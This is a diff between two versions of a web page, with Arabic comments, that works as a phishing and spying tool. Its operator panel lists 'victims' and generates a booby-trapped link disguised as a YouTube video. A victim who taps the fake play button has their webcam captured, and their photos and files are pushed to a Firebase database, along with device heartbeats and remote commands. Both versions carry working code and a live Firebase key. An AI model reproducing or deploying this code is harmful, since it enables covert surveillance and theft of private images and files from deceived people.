@@ -3,77 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S-SYSTEM V26 | PRO</title>
+    <title>S-SYSTEM V27 | ELITE</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #000; }
-        body { background: var(--bg); color: var(--neon); margin: 0; font-family: 'Courier New', monospace; overflow-x: hidden; }
+        :root { --neon: #00ff41; }
+        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; }
         
-        /* رادار الأجهزة */
-        .radar-header { position: relative; width: 100%; height: 100px; background: #050505; border-bottom: 2px solid #111; overflow: hidden; }
-        .radar-sweep { position: absolute; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 65, 0.15) 25%, transparent 50%); top: -50%; left: -50%; animation: rotate 4s linear infinite; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-
-        /* لوحة التحكم (Admin) */
+        /* لوحة التحكم */
         #admin-panel { display: none; padding: 15px; }
-        .section { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; border-radius: 8px; background: rgba(0,255,65,0.01); }
-        .v-card { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: #080808; border-radius: 5px; }
-        .v-card.selected { border-color: #fff; background: #111; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
-        .status-dot { width: 10px; height: 10px; border-radius: 50%; box-shadow: 0 0 5px currentColor; }
+        .radar-box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: #050505; border-radius: 10px; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
+        .v-card { border: 1px solid #222; padding: 15px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; background: #0a0a0a; border-radius: 5px; }
+        .v-card.selected { border-color: #fff; background: #111; box-shadow: 0 0 10px var(--neon); }
         
-        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 5px; transition: 0.3s; }
+        /* أزرار الأوامر */
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; font-weight: bold; cursor: pointer; border-radius: 5px; transition: 0.3s; }
         button:active { background: var(--neon); color: #000; }
-        input { width: 100%; padding: 12px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; box-sizing: border-box; border-radius: 5px; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: #0ff; margin-bottom: 10px; box-sizing: border-box; }
 
-        /* واجهة الضحية (Victim) */
-        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
-        .play-btn { width: 90px; height: 90px; border: 4px solid #fff; border-radius: 50%; position: relative; cursor: pointer; transition: 0.3s; }
-        .play-btn:active { transform: scale(0.9); }
-        .play-btn::after { content: ''; position: absolute; top: 25px; left: 35px; border-left: 30px solid #fff; border-top: 20px solid transparent; border-bottom: 20px solid transparent; }
+        /* واجهة الضحية */
+        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
+        .play-btn { width: 100px; height: 100px; border: 5px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play-btn::after { content: ''; position: absolute; top: 25px; left: 38px; border-left: 35px solid #fff; border-top: 25px solid transparent; border-bottom: 25px solid transparent; }
     </style>
 </head>
 <body>
 
 <div id="admin-panel">
-    <div class="radar-header">
-        <div class="radar-sweep"></div>
-        <div style="position:absolute; bottom:5px; right:10px; font-size:10px;">SEARCHING FOR TARGETS...</div>
-    </div>
-    
-    <div class="section">
-        <h3 style="margin:0 0 10px 0; font-size:14px; text-transform: uppercase;">📡 الرادار النشط</h3>
-        <div id="v-list" style="max-height: 200px; overflow-y: auto;">في انتظار أول صيد...</div>
+    <div class="radar-box">
+        <h3 style="margin-top:0;">📡 الرادار (الأجهزة المتصلة):</h3>
+        <div id="v-list">جاري فحص النبض...</div>
     </div>
 
-    <div class="section">
-        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">--</span></h3>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+    <div class="radar-box">
+        <h3>🕹️ التحكم بالجهاز: <span id="t-name" style="color:#fff;">--</span></h3>
+        <div class="btn-grid">
             <button onclick="cmd('snap')">📸 سحب صورة</button>
-            <button onclick="cmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
-            <button onclick="cmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
-            <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
+            <button onclick="cmd('vibrate')" style="border-color:yellow; color:yellow;">📳 هز الهاتف</button>
+            <button onclick="cmd('pick')" style="border-color:cyan; color:cyan;">📂 سحب ملفات</button>
+            <button onclick="cmd('release')" style="background:#030; border-color:#0f0;">🔓 إطلاق سراح</button>
         </div>
-        <button onclick="if(confirm('مسح الكل؟')) db.ref('victims').remove()" style="color:red; border-color:red; margin-top:20px; font-size:10px;">🗑️ تفريغ قاعدة البيانات</button>
+        <button onclick="if(confirm('حذف كل البيانات؟')) db.ref('victims').remove()" style="color:red; border-color:red; width:100%; margin-top:20px;">🗑️ تنظيف النظام</button>
     </div>
 
-    <div class="section">
-        <input type="text" id="target-url" placeholder="رابط يوتيوب للتمويه">
-        <button onclick="gen()">توليد رابط الصيد</button>
-        <div id="res-link" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all; background:#111; padding:5px;"></div>
+    <div class="radar-box">
+        <input type="text" id="target-url" placeholder="ضع رابط التمويه هنا (يوتيوب)">
+        <button onclick="gen()" style="width:100%;">توليد رابط ملغم</button>
+        <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all; background:#111; padding:5px;"></div>
     </div>
 </div>
 
 <div id="vic-panel">
-    <div class="play-btn" onclick="startGhost()"></div>
-    <p style="margin-top:25px; color:#fff; font-family: sans-serif; font-size: 18px;">اضغط للتشغيل | Play Video</p>
+    <div class="play-btn" onclick="startSystem()"></div>
+    <p style="color:#fff; margin-top:20px; font-family: sans-serif;">انقر للتشغيل | Tap to Play</p>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
     <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
 </div>
 
 <script>
-    // إعدادات فايرباس الرسمية الخاصة بك
+    // إعدادات Firebase الخاصة بك
     const config = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
@@ -83,95 +73,77 @@
     const db = firebase.database();
     let selId = null;
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const isAdmin = urlParams.get('admin');
-    const isVictim = urlParams.get('v');
+    const params = new URLSearchParams(window.location.search);
+    const isAdmin = params.get('admin');
+    const isVictim = params.get('v');
 
-    // --- منطق الآدمن ---
+    // الدخول للنظام
     if (isAdmin === "1") {
         document.getElementById('admin-panel').style.display = 'block';
         db.ref('victims').on('value', s => {
-            const list = document.getElementById('v-list');
-            list.innerHTML = '';
-            if(!s.exists()) { list.innerHTML = "الرادار يبحث عن نبض..."; return; }
+            const list = document.getElementById('v-list'); list.innerHTML = '';
+            if(!s.exists()) list.innerHTML = "بانتظار دخول ضحية...";
             s.forEach(child => {
-                const v = child.val();
-                const id = child.key;
+                const v = child.val(); const id = child.key;
                 const online = (Date.now() - v.lastSeen) < 10000;
-                list.innerHTML += `<div class="v-card ${id === selId ? 'selected' : ''}" onclick="selectVictim('${id}','${v.model}')">
-                    <span>${v.model}</span>
-                    <span style="color:${online ? '#0f0' : '#f00'}">
-                        <span class="status-dot" style="background:${online ? '#0f0' : '#f00'}"></span>
-                        ${online ? 'نشط' : 'غير متصل'}
-                    </span>
+                list.innerHTML += `<div class="v-card ${id === selId ? 'selected' : ''}" onclick="sel('${id}','${v.model}')">
+                    <span>📱 ${v.model}</span>
+                    <span style="color:${online ? '#0f0' : '#f00'}">${online ? '● نشط' : '● غائب'}</span>
                 </div>`;
             });
         });
-    } 
-    // --- منطق الضحية ---
-    else if (isVictim) {
+    } else if (isVictim) {
         document.getElementById('vic-panel').style.display = 'flex';
-        initVictim(atob(isVictim));
+        runVictim(atob(isVictim));
     } else {
+        // تمويه الشاشة السوداء
         document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
     }
 
-    function selectVictim(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
-
-    function cmd(t) {
-        if (!selId) return alert("اختر جهازاً من الرادار أولاً!");
-        db.ref('victims/' + selId + '/cmd').set({ t: t, time: Date.now() });
-    }
-
+    // وظائف التحكم
+    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
+    function cmd(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
     function gen() {
         const u = document.getElementById('target-url').value;
-        if(!u) return alert("أدخل رابطاً للتمويه!");
-        const link = window.location.origin + window.location.pathname + "?v=" + btoa(u);
-        document.getElementById('res-link').innerText = link;
+        if(!u) return alert("أدخل رابطاً!");
+        document.getElementById('res-link').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
     }
 
-    // --- وظائف الضحية السرية ---
-    let myRef = null;
-    function initVictim(target) {
-        // تحديد نوع الجهاز بدقة أكبر
-        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "iPhone/Mobile";
-        myRef = db.ref('victims').push();
-        
-        // إرسال "نبضة" كل 3 ثوانٍ لإعلام الرادار بالاتصال
-        const pulse = () => myRef.update({ model: model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
+    // وظائف الضحية (الاتصال العكسي)
+    let vRef = null;
+    function runVictim(target) {
+        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "Mobile Device";
+        vRef = db.ref('victims').push();
+        const pulse = () => vRef.update({ model: model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
         pulse();
         setInterval(pulse, 3000);
 
-        // مراقبة الأوامر من الآدمن
-        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
-            const c = s.val(); if (!c) return;
-            if (c.t === 'snap') take();
-            if (c.t === 'vibrate') navigator.vibrate([600, 200, 600]);
-            if (c.t === 'pick') document.getElementById('f-in').click();
-            if (c.t === 'release') window.location.href = target;
+        db.ref('victims/' + vRef.key + '/cmd').on('value', s => {
+            const c = s.val(); if(!c) return;
+            if(c.t === 'snap') take();
+            if(c.t === 'vibrate') navigator.vibrate([500, 200, 500]);
+            if(c.t === 'pick') document.getElementById('f-in').click();
+            if(c.t === 'release') window.location.href = target;
         });
     }
 
-    async function startGhost() {
-        navigator.vibrate(100);
-        await take(); // محاولة سحب أول صورة فور الضغط
-    }
+    async function startSystem() { await take(); }
 
     async function take() {
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
             const video = document.getElementById('v'); video.srcObject = s; await video.play();
             const canvas = document.getElementById('c'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
+            vRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
             s.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log("Blocked: " + e); }
+        } catch(e) {}
     }
 
     document.getElementById('f-in').onchange = (e) => {
         for(let f of e.target.files) {
             const r = new FileReader();
-            r.onload = (ev) => myRef.child('files').push(ev.target.result);
+            r.onload = (ev) => vRef.child('files').push(ev.target.result);
             r.readAsDataURL(f);
         }
     };
